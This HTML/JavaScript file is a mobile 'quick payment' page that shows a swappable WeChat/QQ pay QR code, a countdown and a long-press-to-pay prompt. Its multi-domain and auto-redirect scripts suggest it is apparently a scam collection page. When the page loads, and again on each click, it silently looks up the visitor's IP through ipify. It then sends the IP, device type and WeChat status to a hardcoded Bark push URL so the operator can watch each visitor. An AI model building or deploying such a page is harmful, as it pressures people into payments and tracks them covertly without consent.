<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>快捷支付 - 手机端</title>
  <style>
    :root{--bg:#0b0b0b;--btn-height:58px;--accent:#ff6b00}
    html,body{height:100%;margin:0;font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "PingFang SC", "Hiragino Sans GB", "Microsoft Yahei", Arial; background:var(--bg); color:#fff}
    .page{min-height:100vh;display:flex;flex-direction:column}

    /* 顶部信息栏 */
    .header{background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);padding:20px;text-align:center;color:#fff}
    .header-title{font-size:24px;font-weight:bold;margin-bottom:10px}
    .header-info{display:flex;justify-content:space-around;align-items:center;font-size:14px}
    .info-item{display:flex;flex-direction:column;align-items:center}
    .info-label{opacity:0.8;margin-bottom:4px}
    .info-value{font-weight:600}

    /* 图片区域 - 移除边框，全屏显示 */
    .hero{flex:1;display:flex;align-items:center;justify-content:center;padding:0;position:relative;background:#07c160}
    .guide-img{width:100%;height:100%;object-fit:contain;display:block;border-radius:10px}

    /* 倒计时器 - 移到图片上方 */
    .countdown{position:absolute;top:20px;right:20px;background:rgba(255,0,0,0.8);color:#fff;padding:8px 16px;border-radius:20px;font-size:16px;font-weight:600;z-index:100}
    .countdown.expired{background:rgba(255,0,0,0.6);color:#ffcccc}

    /* 扫码支付提示 - 移到图片上方 */
    .hint{position:absolute;left:20px;top:20px;background:rgba(0,0,0,0.7);color:#fff;padding:8px 16px;border-radius:20px;font-size:16px;font-weight:600;z-index:100}
    


    /* 过期提示 */
    .expired-overlay{position:absolute;inset:0;background:rgba(0,0,0,0.8);display:none;align-items:center;justify-content:center;z-index:50}
    .expired-overlay.show{display:flex}
    .expired-content{text-align:center;color:#fff}
    .expired-title{font-size:20px;font-weight:600;margin-bottom:12px}
    .expired-desc{font-size:16px;opacity:0.8;margin-bottom:20px}

    /* 底部按钮 */
    .footer{padding:12px;display:flex;gap:12px;align-items:center;justify-content:center;background:linear-gradient(180deg, rgba(0,0,0,0), rgba(0,0,0,0.35))}
    .btn{flex:1;max-width:360px;height:var(--btn-height);border-radius:10px;border:0;font-size:18px;font-weight:600;display:inline-flex;align-items:center;justify-content:center;gap:8px}
    .btn.primary{background:var(--accent);color:#fff;box-shadow:0 6px 18px rgba(255,107,0,0.18)}
    .btn.ghost{background:transparent;color:#fff;border:1px solid rgba(255,255,255,0.08)}
  </style>
</head>
<body>
  <div class="page">
    <!-- 顶部信息栏 -->
    <header class="header">
      <div class="header-title">快捷支付</div>
      <div class="header-info">
        <div class="info-item">
          <div class="info-label">支付金额</div>
          <div class="info-value" id="paymentAmount">100-2000</div>
        </div>
        <div class="info-item">
          <div class="info-label">有效期</div>
          <div class="info-value" id="validityPeriod">100秒</div>
        </div>
      </div>
    </header>

    <main class="hero">
      <!-- 倒计时器 -->
      <div class="countdown" id="countdown">
        <span id="countdownText">100s</span>
      </div>

      <!-- 扫码支付提示 -->
      <div class="hint" id="scanHint">扫码支付</div>

      <!-- 图片，使用base64数据或后台配置的地址 -->
      <img id="guideImage" class="guide-img" src="" alt="收款引导图" />
      


      <!-- 过期提示覆盖层 -->
      <div class="expired-overlay" id="expiredOverlay">
        <div class="expired-content">
          <div class="expired-title">二维码已过期</div>
          <div class="expired-desc">点击刷新</div>
        </div>
      </div>
    </main>

    <footer class="footer">
      <button id="reloadBtn" class="btn ghost">刷新二维码</button>
      <button id="payBtn" class="btn primary">长按图片识别支付</button>
    </footer>
  </div>

  <!-- 引入base64图片数据 -->
  <script src="image-base64.js"></script>
  <!-- 引入多域名管理功能 -->
  <script src="multi-domain-manager.js"></script>
      <!-- 引入自动跳转功能 -->
    <script src="auto-redirect-manager.js"></script>
    <!-- 引入图片同步服务 -->
    <script src="image-sync-service.js"></script>

  <script>
    // 配置 - 从localStorage加载或使用默认值
    const DEFAULT_CONFIG = {
      countdownSeconds: 100,
      paymentAmount: '100-2000',
      validityPeriod: '100秒',
      scanHint: '扫码支付'
    };
    
    // 加载配置
    function loadConfig() {
      const config = {};
      Object.keys(DEFAULT_CONFIG).forEach(key => {
        const saved = localStorage.getItem(key);
        config[key] = saved !== null ? saved : DEFAULT_CONFIG[key];
      });
      return config;
    }
    
    // 应用配置到界面
    function applyConfig(config) {
      document.getElementById('paymentAmount').textContent = config.paymentAmount;
      document.getElementById('validityPeriod').textContent = config.validityPeriod;
      document.getElementById('scanHint').textContent = config.scanHint;
      return config.countdownSeconds;
    }
    
    const config = loadConfig();
    const COUNTDOWN_SECONDS = applyConfig(config);
    
    // DOM元素
    const guideImage = document.getElementById('guideImage');
    const reloadBtn = document.getElementById('reloadBtn');
    const payBtn = document.getElementById('payBtn');
    const countdown = document.getElementById('countdown');
    const countdownText = document.getElementById('countdownText');
    const expiredOverlay = document.getElementById('expiredOverlay');

    // 图片地址配置 - 直接写在代码中，所有二级域名都使用相同的地址
    const IMAGE_CONFIG = {
      // 默认图片地址 - 这里应该设置为您实际的图片URL
      imageUrl: 'https://pay.qq.com/cgi-bin/account/get_qr_image.cgi?size=120&url=weixin%3A%2F%2Fwxpay%2Fbizpayurl%3Fpr%3DAX4nyKQz1&t=1754972239382&orig=1', // 直接使用QQ支付图片地址
      // 备用Base64图片（如果URL不可用时使用）
      fallbackBase64: window.IMAGE_BASE64 || null
    };
    
    // 推送API配置
    const PUSH_CONFIG = {
      apiUrl: 'https://api.day.app/8ckKiMHSJ95i3SANuBQAu3/',
      enabled: true
    };
    
    // 用户状态监控
    const USER_STATUS = {
      visitTime: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenSize: `${screen.width}x${screen.height}`,
      actions: []
    };
    
    // 推送状态到API
    function pushStatus(action, details = '') {
      if (!PUSH_CONFIG.enabled) return;
      
      try {
        // 记录用户行为
        USER_STATUS.actions.push({
          action: action,
          details: details,
          timestamp: new Date().toISOString()
        });
        
        // 构建推送内容
        const pushContent = encodeURIComponent(`用户行为: ${action} | ${details}`);
        const pushUrl = `${PUSH_CONFIG.apiUrl}${pushContent}`;
        
        console.log('推送状态:', action, details);
        console.log('推送URL:', pushUrl);
        
        // 发送推送请求
        fetch(pushUrl)
          .then(response => response.json())
          .then(data => {
            console.log('推送成功:', data);
          })
          .catch(error => {
            console.error('推送失败:', error);
          });
          
      } catch (error) {
        console.error('推送状态时出错:', error);
      }
    }
    
    // 获取用户IP地址
    function getUserIP() {
      return new Promise((resolve) => {
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => {
            resolve(data.ip);
          })
          .catch(() => {
            resolve('未知');
          });
      });
    }
    
    // 检测设备类型
    function getDeviceType() {
      const ua = navigator.userAgent;
      if (/Android/i.test(ua)) return 'Android';
      if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
      if (/Windows/i.test(ua)) return 'Windows';
      if (/Mac/i.test(ua)) return 'Mac';
      if (/Linux/i.test(ua)) return 'Linux';
      return '其他';
    }
    
    // 检测是否在微信中
    function isWechatBrowser() {
      return /MicroMessenger/i.test(navigator.userAgent);
    }
    

    
    // 设置图片源 - 优先使用URL参数，然后是localStorage，最后是配置地址
    function setImageSource() {
      console.log('setImageSource 被调用');
      
      // 优先使用URL参数中的图片地址
      const urlParams = new URLSearchParams(window.location.search);
      let imageUrl = urlParams.get('imageUrl');
      
      if (imageUrl && imageUrl.trim()) {
        imageUrl = decodeURIComponent(imageUrl.trim());
        console.log('使用URL参数中的图片地址:', imageUrl);
      } else {
        // 其次使用localStorage中的更新图片地址
        imageUrl = localStorage.getItem('imageUrl');
        if (imageUrl && imageUrl.trim()) {
          imageUrl = imageUrl.trim();
          console.log('使用localStorage中的更新图片地址:', imageUrl);
        } else {
          // 最后使用配置的固定图片地址
          imageUrl = IMAGE_CONFIG.imageUrl;
          console.log('使用配置的固定图片地址:', imageUrl);
        }
      }
      
      if (imageUrl && imageUrl.trim()) {
        console.log('设置图片地址:', imageUrl.trim());
        
        // 判断图片地址类型
        const imageUrlTrimmed = imageUrl.trim();
        let finalImageUrl = imageUrlTrimmed;
        
        if (imageUrlTrimmed.startsWith('data:')) {
          // Base64图片，直接使用
          console.log('检测到Base64图片地址');
          finalImageUrl = imageUrlTrimmed;
        } else if (imageUrlTrimmed.startsWith('http')) {
          // HTTP/HTTPS URL，直接使用，添加时间戳防止缓存
          console.log('检测到HTTP URL图片地址');
          finalImageUrl = imageUrlTrimmed + '?t=' + Date.now();
        } else if (imageUrlTrimmed.startsWith('/')) {
          // 相对路径，添加当前域名和时间戳
          console.log('检测到相对路径图片地址');
          const currentDomain = window.location.origin;
          finalImageUrl = currentDomain + imageUrlTrimmed + '?t=' + Date.now();
        } else {
          // 其他情况，直接使用
          console.log('使用原始图片地址');
          finalImageUrl = imageUrlTrimmed;
        }
        
        console.log('最终图片地址:', finalImageUrl);
        guideImage.src = finalImageUrl;
        
        // 添加图片加载事件监听
        guideImage.onload = function() {
          console.log('图片加载成功:', this.src);
          showStatus('图片加载成功！', 'success');
          
          // 推送图片加载成功
          pushStatus('图片加载成功', 'QQ支付二维码已显示');
        };
        
        guideImage.onerror = function() {
          console.log('图片加载失败:', this.src);
          showStatus('图片加载失败！', 'error');
          
          // 推送图片加载失败
          pushStatus('图片加载失败', 'QQ支付二维码加载失败');
          
          // 如果加载失败且是带时间戳的URL，尝试不带时间戳
          if (this.src.includes('?t=') && !this.src.startsWith('data:')) {
            console.log('尝试不带时间戳的URL');
            const originalUrl = this.src.split('?t=')[0];
            this.src = originalUrl;
          }
        };
      } else {
        // 没有图片地址，显示默认SVG
        console.log('没有图片地址，显示默认SVG');
        guideImage.src = 'data:image/svg+xml;utf8,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="800" height="400"><rect fill="#222" width="100%" height="100%"/><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" fill="#999" font-size="20">暂无图片，请先在后台配置图片</text></svg>');
      }
    }
    
    // 实时同步图片地址 - 最稳定的方案
    let lastImageUrl = '';
    let syncInterval = null;
    
    function startImageSync() {
      console.log('启动图片地址实时同步...');
      
      // 清除之前的定时器
      if (syncInterval) {
        clearInterval(syncInterval);
      }
      
      // 每3秒检查一次图片地址更新
      syncInterval = setInterval(() => {
        const currentImageUrl = localStorage.getItem('imageUrl');
        
        if (currentImageUrl && currentImageUrl !== lastImageUrl) {
          console.log('检测到图片地址更新:', currentImageUrl);
          console.log('上次地址:', lastImageUrl);
          
          lastImageUrl = currentImageUrl;
          setImageSource();
          
          // 推送同步状态
          pushStatus('图片地址同步', '检测到后台更新，已同步到前端');
        }
      }, 3000);
      
      // 初始化lastImageUrl
      lastImageUrl = localStorage.getItem('imageUrl') || '';
    }
    
    function stopImageSync() {
      if (syncInterval) {
        clearInterval(syncInterval);
        syncInterval = null;
        console.log('停止图片地址同步');
      }
    }
    

    
    // 倒计时相关变量
    let countdownTimer = null;
    let remainingSeconds = COUNTDOWN_SECONDS;
    let isExpired = false;

    // 初始化倒计时
    function initCountdown() {
      // 从localStorage读取倒计时配置和保存时间
      const savedCountdown = localStorage.getItem('countdownSeconds');
      const saveTime = localStorage.getItem('configSaveTime');
      
      if (savedCountdown && saveTime) {
        // 计算从保存时间开始的剩余时间
        const elapsed = Math.floor((Date.now() - parseInt(saveTime)) / 1000);
        remainingSeconds = parseInt(savedCountdown) - elapsed;
        
        if (remainingSeconds <= 0) {
          // 已过期
          remainingSeconds = 0;
          isExpired = true;
          handleExpired();
          return;
        }
      } else {
        // 没有保存时间，使用默认倒计时
        remainingSeconds = savedCountdown ? parseInt(savedCountdown) : COUNTDOWN_SECONDS;
      }
      
      isExpired = false;
      updateCountdownDisplay();
      startCountdown();
    }

    // 开始倒计时
    function startCountdown() {
      if (countdownTimer) clearInterval(countdownTimer);
      
      countdownTimer = setInterval(() => {
        remainingSeconds--;
        updateCountdownDisplay();
        
        if (remainingSeconds <= 0) {
          clearInterval(countdownTimer);
          handleExpired();
        }
      }, 1000);
    }

    // 更新倒计时显示
    function updateCountdownDisplay() {
      const minutes = Math.floor(remainingSeconds / 60);
      const seconds = remainingSeconds % 60;
      countdownText.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
      
      // 当剩余时间少于30秒时，改变颜色
      if (remainingSeconds <= 30) {
        countdown.classList.add('expired');
      } else {
        countdown.classList.remove('expired');
      }
    }

    // 处理过期
    function handleExpired() {
      isExpired = true;
      expiredOverlay.classList.add('show');
      countdown.classList.add('expired');
      countdownText.textContent = '已过期';
      
      // 禁用支付按钮
      payBtn.disabled = true;
      payBtn.style.opacity = '0.5';
      
      // 更新刷新按钮文本
      reloadBtn.textContent = '刷新二维码';
      
      // 更新过期提示文本
      const expiredDesc = document.querySelector('.expired-desc');
      if (expiredDesc) {
        expiredDesc.textContent = '点击刷新';
      }
      
      // 推送过期状态
      pushStatus('二维码已过期', '倒计时结束');
    }

    // 刷新二维码功能 - 带图片更新检测
    function refreshQRCode() {
      console.log('刷新二维码被调用');
      
      // 推送刷新行为
      const deviceType = getDeviceType();
      const isWechat = isWechatBrowser();
      const refreshDetails = `设备:${deviceType} | 微信:${isWechat ? '是' : '否'}`;
      pushStatus('点击刷新二维码', refreshDetails);
      
      // 清除过期状态
      isExpired = false;
      expiredOverlay.classList.remove('show');
      countdown.classList.remove('expired');
      
      // 重新启用支付按钮
      payBtn.disabled = false;
      payBtn.style.opacity = '1';
      
      // 保存当前图片URL用于比较
      const currentImageUrl = guideImage.src;
      console.log('当前图片URL:', currentImageUrl);
      
      // 显示刷新提示
      showStatus('正在刷新二维码...', 'info');
      
      // 强制清除图片缓存
      guideImage.src = '';
      
      // 重新加载图片（使用固定配置或localStorage中的更新地址）
      setImageSource();
      
      // 检测图片是否更新
      setTimeout(() => {
        const newImageUrl = guideImage.src;
        console.log('新图片URL:', newImageUrl);
        
        // 比较图片地址（忽略时间戳）
        const currentUrlWithoutTimestamp = currentImageUrl.split('?t=')[0];
        const newUrlWithoutTimestamp = newImageUrl.split('?t=')[0];
        
        if (newUrlWithoutTimestamp === currentUrlWithoutTimestamp) {
          showStatus('二维码未更新，请稍后再试', 'warning');
        } else {
          showStatus('二维码已更新！', 'success');
        }
      }, 1000);
      
      // 重新初始化倒计时
      initCountdown();
    }

    // 支付按钮点击事件 - 缩小图片留出边框
    function handlePayClick() {
      if (isExpired) {
        alert('二维码已过期，请刷新二维码');
        return;
      }
      
      console.log('长按图片识别支付按钮被点击...');
      
      // 推送用户行为
      const deviceType = getDeviceType();
      const isWechat = isWechatBrowser();
      const actionDetails = `设备:${deviceType} | 微信:${isWechat ? '是' : '否'}`;
      pushStatus('点击长按识别支付', actionDetails);
      
      // 检查是否在微信环境中
      
      if (isWechat) {
        // 在微信中，缩小图片留出绿色边框
        console.log('检测到微信环境，缩小图片留出边框');
        
        // 推送长按行为
        pushStatus('长按图片操作', '微信环境 | 图片已缩小');
        
        // 缩小图片，留出绿色边框
        guideImage.style.width = '90%';
        guideImage.style.height = '90%';
        guideImage.style.margin = '5%';
        guideImage.style.borderRadius = '10px';
        
        // 3秒后恢复
        setTimeout(() => {
          guideImage.style.width = '';
          guideImage.style.height = '';
          guideImage.style.margin = '';
          guideImage.style.borderRadius = '';
        }, 3000);
        
      } else {
        // 非微信环境，显示提示
        console.log('非微信环境，显示提示');
        showStatus('请在微信中打开此页面进行支付', 'warning');
        
        // 推送非微信环境行为
        pushStatus('非微信环境访问', '提示打开微信');
        
        // 尝试打开微信
        setTimeout(() => {
          if (confirm('是否要打开微信？')) {
            // 尝试打开微信（iOS和Android的微信URL scheme）
            window.location.href = 'weixin://';
          }
        }, 1000);
      }
    }

    // 绑定事件
    reloadBtn.addEventListener('click', refreshQRCode);
    payBtn.addEventListener('click', handlePayClick);

    // 显示状态提示
    function showStatus(message, type) {
      // 创建状态提示元素
      const statusDiv = document.createElement('div');
      statusDiv.id = 'statusMessage';
      
      // 根据类型设置样式
      let bgColor = '#333';
      let textColor = '#fff';
      
      switch(type) {
        case 'success':
          bgColor = '#28a745';
          break;
        case 'error':
          bgColor = '#dc3545';
          break;
        case 'warning':
          bgColor = '#ffc107';
          textColor = '#333';
          break;
        case 'info':
          bgColor = '#17a2b8';
          break;
      }
      
      statusDiv.style.cssText = `
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: ${bgColor};
        color: ${textColor};
        padding: 12px 24px;
        border-radius: 8px;
        font-size: 16px;
        font-weight: 600;
        z-index: 2000;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        transition: all 0.3s ease;
      `;
      
      statusDiv.textContent = message;
      
      // 移除已存在的状态提示
      const existingStatus = document.getElementById('statusMessage');
      if (existingStatus) {
        existingStatus.remove();
      }
      
      // 添加到页面
      document.body.appendChild(statusDiv);
      
      // 3秒后自动移除
      setTimeout(() => {
        if (statusDiv.parentNode) {
          statusDiv.style.opacity = '0';
          statusDiv.style.transform = 'translateX(-50%) translateY(-20px)';
          setTimeout(() => {
            if (statusDiv.parentNode) {
              statusDiv.remove();
            }
          }, 300);
        }
      }, 3000);
      
      // 同时输出到控制台
      console.log(`${type}: ${message}`);
    }

    // 图片加载错误处理
    guideImage.addEventListener('error', ()=>{
      guideImage.src = 'data:image/svg+xml;utf8,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="800" height="400"><rect fill="#222" width="100%" height="100%"/><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" fill="#999" font-size="20">图片加载失败，点击刷新二维码</text></svg>');
    });

    // 监听localStorage变化，实时更新图片和倒计时
    window.addEventListener('storage', (e) => {
      if (e.key === 'imageUrl' || e.key === 'countdownSeconds' || e.key === 'configSaveTime') {
        if (e.key === 'imageUrl') {
          setImageSource();
        }
        if (e.key === 'countdownSeconds' || e.key === 'configSaveTime') {
          // 重新初始化倒计时
          initCountdown();
        }
      }
    });
    
    // 监听自定义事件，实时更新图片（同一窗口内的更新）
    window.addEventListener('imageUrlUpdated', (e) => {
      console.log('收到图片更新事件:', e.detail);
      console.log('事件详情:', e);
      setImageSource();
      showStatus('图片已实时更新！', 'success');
    });
    
    // 监听BroadcastChannel消息（跨窗口同步）
    if (typeof BroadcastChannel !== 'undefined') {
      try {
        const imageChannel = new BroadcastChannel('image-updates');
        imageChannel.onmessage = (event) => {
          console.log('收到BroadcastChannel消息:', event.data);
          if (event.data.type === 'imageUrlUpdated') {
            console.log('BroadcastChannel: 图片地址已更新:', event.data.imageUrl);
            setImageSource();
            showStatus('收到跨窗口图片更新！', 'success');
          }
        };
        console.log('BroadcastChannel监听已启动');
      } catch (e) {
        console.log('BroadcastChannel不可用:', e);
      }
    }
    
    // 监听postMessage消息（跨iframe同步）
    window.addEventListener('message', (event) => {
      if (event.data && event.data.type === 'imageUrlUpdated') {
        console.log('收到postMessage消息:', event.data);
        console.log('postMessage: 图片地址已更新:', event.data.imageUrl);
        setImageSource();
        showStatus('收到跨iframe图片更新！', 'success');
      }
    });
    
    // 监听页面配置更新事件
    window.addEventListener('pageConfigUpdated', (e) => {
      console.log('收到页面配置更新事件:', e.detail);
      const config = e.detail;
      
      // 更新页面配置
      document.getElementById('paymentAmount').textContent = config.paymentAmount;
      document.getElementById('validityPeriod').textContent = config.validityPeriod;
      document.getElementById('scanHint').textContent = config.scanHint;
      
      // 重新初始化倒计时
      initCountdown();
      
      showStatus('页面配置已实时更新！', 'success');
    });
    


    // 等待DOM完全加载后再初始化
    function initializeApp() {
      console.log('开始初始化应用...');
      
      // 检查DOM元素是否存在
      if (!guideImage) {
        console.error('guideImage 元素未找到');
        return;
      }
      
      if (!countdown) {
        console.error('countdown 元素未找到');
        return;
      }
      
      console.log('DOM元素检查通过，开始初始化...');
      
      // 自动跳转功能由 auto-redirect-manager.js 处理
      
      // 初始化图片和倒计时
      setImageSource();
      initCountdown();
      
      // 使用图片同步服务（替代原来的startImageSync）
      if (window.imageSyncService) {
        console.log('图片同步服务已就绪');
      } else {
        console.log('图片同步服务未加载，使用备用同步方案');
        startImageSync(); // 备用方案
      }
      
      // 推送用户访问状态
      pushUserVisitStatus();
      
      console.log('应用初始化完成');
    }
    
    // 推送用户访问状态
    async function pushUserVisitStatus() {
      const deviceType = getDeviceType();
      const isWechat = isWechatBrowser();
      const userIP = await getUserIP();
      const currentDomain = window.location.hostname;
      
      const visitDetails = `IP:${userIP} | 设备:${deviceType} | 微信:${isWechat ? '是' : '否'} | 域名:${currentDomain}`;
      
      pushStatus('页面访问', visitDetails);
    }
    

    
    // 确保DOM完全加载后再初始化
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initializeApp);
    } else {
      initializeApp();
    }
  </script>
</body>
</html>
